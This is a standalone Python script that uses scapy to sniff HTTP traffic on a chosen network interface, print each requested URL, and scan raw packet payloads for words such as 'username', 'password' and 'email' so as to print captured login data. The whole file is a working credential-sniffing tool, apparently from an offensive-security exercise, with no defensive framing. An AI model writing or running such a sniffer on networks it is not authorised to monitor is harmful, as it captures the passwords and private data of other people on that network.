#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="This is the interface to sniff")
    options = parser.parse_args()
    if options.interface is None:
        print("[!] Please enter an interface")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_logins(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keyword = ["username", "user", "login", "password", "pass", "email"]
        for word in keyword:
            if word in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request -> {}".format(url))
        login_info = get_logins(packet)
        if login_info:
            print("\n\n[+] Possible username/password -> " + login_info + "\n\n")

options = get_args()
sniff(options.interface)